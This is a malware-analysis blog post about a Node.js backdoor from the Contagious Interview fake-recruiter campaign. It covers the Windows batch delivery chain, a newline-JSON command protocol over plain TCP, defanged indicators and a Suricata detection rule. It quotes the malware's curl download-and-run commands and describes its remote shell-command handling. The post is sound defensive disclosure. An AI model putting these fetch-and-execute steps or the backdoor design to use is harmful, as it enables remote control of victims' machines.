---
title: "A raw TCP backdoor behind the cleverstack git hook lure"
date: 2026-11-02
draft: false
slug: "raw-tcp-backdoor-cleverstack"
description: "Two files tagged BeaverTail turn out to be a Node.js backdoor that skips HTTP and Socket.IO and talks newline-delimited JSON over plain TCP. Protocol, delivery chain, detections."
tldr: "A Node.js backdoor delivered through the Contagious Interview git hook lure talks newline-delimited JSON to `5.230.122[.]63:15152` over plain TCP and runs whatever the server sends. This post covers the delivery chain, the protocol and Suricata, Sigma and YARA rules tested against it."
iocs: "/iocs/raw-tcp-backdoor-cleverstack.csv"
---

## Summary

Two JavaScript files uploaded to MalwareBazaar on 10 July 2026 and tagged
BeaverTail don't behave like BeaverTail. They skip the HTTP endpoints that
BeaverTail is known for (`/pdown`, `/client/<id>`, `/uploads`, `/keys`) and
open a plain TCP connection to `5.230.122[.]63:15152`. Over it they send
newline-delimited JSON status messages and run whatever the server sends back
as a shell command. A Windows batch file uploaded in the same few minutes, also anonymously,
installs a portable Node.js and pulls that backdoor down as `loader.js` from
`cleverstack-ext30341.vercel[.]app`, the same Vercel C2 that Snyk and a
developer's write-up tied to the Contagious Interview git hook lure. I could
not find a public report of the TCP backdoor or of the address and port.
ThreatFox and URLhaus had nothing on either when I checked on 2 November 2026;
the indicators below have since been submitted to both.

| SHA-256 | File name on MB | Notes |
| --- | --- | --- |
| `281d4d60fc99cf7f54819defb1c7c14b9202d46890936c4c6b9ebe3ddc75dd2f` | parser.js | backdoor, 379-entry string array |
| `6db4c3d2ab56227d36eff59d1dc9e13eadf9959996fab1e0b04591cc5e637d04` | loader.js | same backdoor, 312-entry string array |
| `f101fda6093f12758efae630bc265d6bad71479249685b7503c05e707424a276` | windows.body | Windows batch stage that installs Node.js and fetches the backdoor |

## How it was analysed

Nothing was run on a real system. Both files went through
[crumble](https://github.com/n4uu/crumble), which undoes the
javascript-obfuscator string array statically and then emulates the script
in goja, a Go JavaScript interpreter, with every Node.js API that reaches
the outside world replaced by a stub that only records the call. Getting
these two samples through it took three fixes, described at the end,
because they are the first ones in my set with all of the obfuscator's
anti-analysis options turned on.

## Delivery on Windows

The batch file relaunches itself hidden through PowerShell, asks
nodejs.org for the latest release, downloads the MSI and extracts it with
`msiexec /a` into a `nodejs` folder next to itself, so nothing gets
installed system-wide. Then:

```bat
curl -L -o "%APPDATA%\VSCODE\package.json" "hxxp://cleverstack-ext30341.vercel[.]app/api/package"
call npm install
curl -L -o "%APPDATA%\VSCODE\loader.js" "hxxp://cleverstack-ext30341.vercel[.]app/api/g?st=<token>"
start "" /b "%NODE_EXE%" "%~dp0VSCODE\loader.js"
```

The `st` token is base64 of an `IV:ciphertext` pair, so the server
presumably decides per request what to hand out. One of the two backdoor
builds was uploaded to MalwareBazaar as `loader.js`.

## The backdoor

Both builds are javascript-obfuscator output with a base64 string array,
control flow flattening, dead code injection and debug protection. With the
strings back, the logic is short.

**Start-up.** If `%TEMP%\.git-checker` exists, its contents are read and
reported to the C2 later (`0` otherwise). Something earlier in the chain
presumably writes it, which would let the operator tell infection paths
apart. The script then deletes itself together with the `package.json`
and `package-lock.json` that the batch stage put next to it. It takes a
lock file, `%TEMP%\vscode-ext.lock`, and rewrites the timestamp in it every
10 minutes; a lock older than 20 minutes counts as stale. A second copy
exits while the lock is fresh.

**Host ID.** A stable machine ID per platform: `MachineGuid` from
`reg query HKLM\Software\Microsoft\Cryptography` on Windows,
`IOPlatformUUID` from `ioreg` on macOS, `/etc/machine-id` on Linux, and the
host name if any of those fails.

**C2.** Host and port are constants, `SERVER_HOST = '5.230.122[.]63'` and
`SERVER_PORT = process.env.SERVER_PORT || 15152`. The environment override
is presumably for the operator's own testing. The connection is a bare
`net.Socket` with a six-minute idle timeout before connecting and TCP
keepalive. A third constant, `SERVER_API_URL`, is
`hxxp://cleverstack-ext30341.vercel[.]app/api/handle`; its use is below.

**Protocol.** Every message from the implant is one JSON object followed by
a newline:

```
{"status":"connected","message":"win32?<machine-id>?<hostname>?0","timestamp":"..."}
{"status":"keepalive","message":"","timestamp":"..."}
```

The check-in `message` is `platform?machine-id?hostname?git-checker`.
Keepalives follow every 5 minutes, or every 45 seconds on macOS.

Anything the server sends is trimmed and treated as one command:

- `cd <dir>` changes the working directory and answers
  `{"status":"completed","message":"Changed directory to ..."}`.
- `ss_exec <cmd>` runs the command detached in the background, through
  `start /b cmd /c` on Windows, and sends nothing back. If the command
  contains `URLS<param>`, that token is replaced by
  `hxxp://cleverstack-ext30341.vercel[.]app/api/handle?param=<param>`. So
  the operator can write `ss_exec curl -o x URLSabc` and the implant fills
  in the download URL: `/api/handle` is where follow-up payloads come from.
- Anything else goes to `exec` with a 60 second timeout, and the first 2000
  characters of output come back as `{"status":"completed","message":"Output: ..."}`,
  or `"status":"error"` on failure.

There is no authentication, no encryption and no framing beyond the
newline.

**Reconnects.** On `error` or `close` it clears its health-check timer and
schedules a reconnect after `RECONNECT_DELAY = 600000` ms, ten minutes.

## Why it matters

The campaign's tooling so far talks HTTP (BeaverTail, InvisibleFerret) or
Socket.IO (OtterCookie). A plain TCP channel on a high port means detections
written for those protocols, including Engine.IO handshake signatures and
the usual port list (1224, 1244, 1245, 1418, 8085 to 8087), miss it. The
JSON lines are cleartext, so it is easy to catch on the wire once you know
to look:

```
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Contagious Interview Node.js raw TCP backdoor check-in"; \
    flow:established,to_server; \
    content:"{|22|status|22 3a 22|connected|22 2c 22|message|22 3a 22|"; startswith; \
    pcre:"/^\{\x22status\x22:\x22connected\x22,\x22message\x22:\x22(?:win32|darwin|linux)\?[^?\x22]+\?[^?\x22]+\?[^\x22]*\x22,\x22timestamp\x22:\x22\d{4}-\d\d-\d\dT/"; \
    flowbits:isnotset,ci.tcp.checkin; flowbits:set,ci.tcp.checkin; \
    classtype:trojan-activity; sid:9000001; rev:1;)
```

Tested with Suricata 7.0.3 against synthetic captures built from the
protocol above: it fires once per connection on Windows and macOS
check-ins on any port, and stays quiet on the same JSON inside an HTTP
body, on other apps that send a `"connected"` status line, and on inbound
connections. It doesn't depend on the port, so a new C2 address doesn't
break it.

On the host: `node` holding a long-lived outbound TCP connection to a
non-HTTP port, `%TEMP%\vscode-ext.lock` and `%TEMP%\.git-checker`, a
portable Node.js under `nodejs\PFiles64` next to a batch file, and `node`
spawning `reg query ... MachineGuid` or `start /b cmd /c`.

## Indicators

| Indicator | Role |
| --- | --- |
| `5.230.122[.]63:15152` | C2, plain TCP |
| `hxxp://cleverstack-ext30341.vercel[.]app/api/handle` | follow-up payloads (`ss_exec ... URLS<param>`) |
| `hxxp://cleverstack-ext30341.vercel[.]app/api/g?st=<token>` | backdoor download |
| `hxxp://cleverstack-ext30341.vercel[.]app/api/package` | `package.json` for the backdoor |
| `%TEMP%\vscode-ext.lock` | single-instance lock |
| `%TEMP%\.git-checker` | marker read at start, sent in the check-in |

Hashes in the table at the top. All of it as CSV at the end of the post. The
rules, with their tests, are in [crumble](https://github.com/n4uu/crumble/tree/main/rules).

## What the samples did to my tooling

Three things in these two files broke crumble, and they will break other
tools the same way:

1. **Debug protection relies on a catchable stack overflow.** The
   obfuscator builds `debugger` functions in a recursion with no base case
   and wraps it in `try`. In Node the stack overflows and the `catch` swallows
   the `RangeError`. In goja the overflow isn't catchable, so the emulator
   compiled functions until it ran out of time. The fix is to throw that
   `RangeError` from the Function constructor stub as soon as the body is
   `debugger`.
2. **Folding a dead-code branch can delete a parenthesis.** goja ends an
   expression statement at its last token, so `else a ? b() : (c(), d());`
   ends before the closing `)`. Cutting the dead `if` there left a stray `)`,
   the result no longer parsed, and the report came out with zero
   indicators even though the C2 was sitting in the deobfuscated text.
3. **The net module needs more than `connect`.** The sample calls
   `setTimeout` and `setKeepAlive` on the socket before connecting. A stub
   without them throws, the sample's own `catch` schedules a reconnect ten
   minutes out, and the connection never shows up.

All three are fixed, with tests, in crumble's main branch.

## References

- Snyk, [Inside StegaBin](https://snyk.io/articles/inside-stegabin/), on the cleverstack Vercel infrastructure.
- [How a "dream freelance gig" tried to run malware on my Mac](https://mahmudul.dev/posts/fake-recruiter-git-hook-malware), a first-hand account of the git hook lure.
- [crumble's validation on ten MalwareBazaar samples](https://github.com/n4uu/crumble#validation-on-real-samples), where these two first showed up.
- Detection rules: [YARA, Sigma and Suricata](https://github.com/n4uu/crumble/tree/main/rules) in crumble, with their tests.
